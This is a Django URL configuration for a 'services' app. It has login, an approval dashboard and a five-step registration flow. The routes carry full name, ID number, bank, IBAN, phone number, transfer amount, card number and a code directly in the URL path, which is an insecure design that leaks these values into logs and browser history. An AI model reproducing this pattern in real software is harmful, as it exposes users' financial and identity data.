from django.urls import path
from . import views

app_name = "services"

urlpatterns = [
    path('', views.ShowIndex, name= 'index'),
    path('login/', views.ShowLogin, name= 'login'),
    path('logout/', views.LogoutUser, name= 'logout'),
    path('dashboard/', views.dashboard, name= 'dashboard'),
    path('edit/', views.editMsgs, name= 'edit'),
    path('dashboard/<id>/approve/', views.approveRequest, name= 'approve'),
    path('dashboard/<id>/disapprove/', views.disApproveRequest, name= 'disApprove'),
    path('Service/', views.ShowService, name= 'service'),
    path('Register1/', views.ShowRegister1, name= 'register1'),
    path('Register2/<full_name>/<idNum>/', views.ShowRegister2, name= 'register2'),
    # path('Register3/<fullName>/<idNum>/<bank>/<iban>/<phoneNum>/', views.ShowRegister3, name= 'register3'),
    path('Register3/<fullName>/<idNum>/<bank>/<otherBank>/<iban>/<phoneNum>/', views.ShowRegister3, name= 'register3'),
    path('Register4/<fullName>/<idNum>/<bank>/<otherBank>/<iban>/<phoneNum>/<transferId>/<amount>/', views.ShowRegister4, name= 'register4'),
    path('Register5/<fullName>/<idNum>/<bank>/<otherBank>/<iban>/<phoneNum>/<transferId>/<amount>/<reqNum>/<CardNum>/<Code>/', views.ShowRegister5, name= 'register5'),
    path('Done/', views.ShowSuccess, name= 'done'),
    
]